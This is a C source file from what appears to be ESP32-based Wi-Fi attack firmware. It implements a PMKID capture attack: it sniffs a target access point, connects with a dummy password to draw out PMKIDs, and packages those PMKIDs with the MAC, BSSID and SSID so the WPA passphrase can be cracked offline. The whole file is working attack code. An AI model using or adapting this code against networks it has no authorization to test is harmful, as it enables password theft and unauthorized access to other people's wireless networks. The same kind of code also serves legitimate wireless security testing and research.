#include "attack_pmkid.h"

#include <string.h>

#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
#include "esp_log.h"
#include "esp_err.h"
#include "esp_event.h"

#include "attack.h"
#include "capture_session.h"
#include "wifi_controller.h"
#include "frame_analyzer.h"

static const char *TAG = "main:attack_pmkid";
static const wifi_ap_record_t *ap_record = NULL;

static void free_pmkid_list(pmkid_item_t *head) {
    while (head != NULL) {
        pmkid_item_t *next = head->next;
        free(head);
        head = next;
    }
}

static void pmkid_exit_condition_handler(void *args, esp_event_base_t event_base,
                                         int32_t event_id, void *event_data) {
    if (event_data == NULL || ap_record == NULL) {
        ESP_LOGE(TAG, "PMKID event missing required data");
        return;
    }

    pmkid_item_t *pmkid_item_head = *(pmkid_item_t **)event_data;
    if (pmkid_item_head == NULL) {
        return;
    }

    unsigned pmkid_item_count = 0;
    for (pmkid_item_t *item = pmkid_item_head;
         item != NULL;
         item = item->next) {
        pmkid_item_count++;
    }

    ESP_LOGI(TAG, "Found %u PMKID candidate(s)", pmkid_item_count);

    const size_t ssid_len =
        strnlen((const char *)ap_record->ssid, sizeof(ap_record->ssid));

    const size_t total_size =
        6 + 6 + 1 + ssid_len + ((size_t)pmkid_item_count * 16);

    if (total_size > UINT16_MAX) {
        ESP_LOGE(TAG, "PMKID result is too large: %u", (unsigned)total_size);
        free_pmkid_list(pmkid_item_head);
        attack_update_status(FAILED);
        capture_session_finish(CAPTURE_SESSION_FAILED);
        attack_pmkid_stop();
        return;
    }

    char *content = attack_alloc_result_content((unsigned)total_size);
    if (content == NULL) {
        free_pmkid_list(pmkid_item_head);
        attack_update_status(FAILED);
        capture_session_finish(CAPTURE_SESSION_FAILED);
        attack_pmkid_stop();
        return;
    }

    uint8_t *cursor = (uint8_t *)content;

    wifictl_get_sta_mac(cursor);
    cursor += 6;

    memcpy(cursor, ap_record->bssid, 6);
    cursor += 6;

    *cursor++ = (uint8_t)ssid_len;
    memcpy(cursor, ap_record->ssid, ssid_len);
    cursor += ssid_len;

    for (pmkid_item_t *item = pmkid_item_head;
         item != NULL;
         item = item->next) {
        memcpy(cursor, item->pmkid, 16);
        cursor += 16;
    }

    free_pmkid_list(pmkid_item_head);

    capture_session_record_pmkid(pmkid_item_count);
    capture_session_set_result((uint16_t)total_size, false);
    capture_session_finish(CAPTURE_SESSION_COMPLETE);

    attack_update_status(FINISHED);
    attack_pmkid_stop();

    ESP_LOGI(TAG, "PMKID capture complete");
}

void attack_pmkid_start(attack_config_t *attack_config) {
    if (attack_config == NULL || attack_config->ap_record == NULL) {
        ESP_LOGE(TAG, "Invalid PMKID attack configuration");
        return;
    }

    ESP_LOGI(TAG, "Starting PMKID capture...");
    ap_record = attack_config->ap_record;

    wifictl_sniffer_filter_frame_types(true, false, false);

    /*
     * Register the consumer before starting any connection activity so a fast
     * response cannot be missed.
     */
    ESP_ERROR_CHECK(esp_event_handler_register(
        FRAME_ANALYZER_EVENTS,
        DATA_FRAME_EVENT_PMKID,
        &pmkid_exit_condition_handler,
        NULL));

    frame_analyzer_capture_start(
        SEARCH_PMKID,
        ap_record->bssid);

    wifictl_sniffer_start(ap_record->primary);
    wifictl_sta_connect_to_ap(ap_record, "dummypassword");
}

void attack_pmkid_stop() {
    wifictl_sta_disconnect();
    wifictl_sniffer_stop();
    frame_analyzer_capture_stop();

    ESP_ERROR_CHECK(esp_event_handler_unregister(
        FRAME_ANALYZER_EVENTS,
        DATA_FRAME_EVENT_PMKID,
        &pmkid_exit_condition_handler));

    ap_record = NULL;
    ESP_LOGD(TAG, "PMKID capture stopped");
}
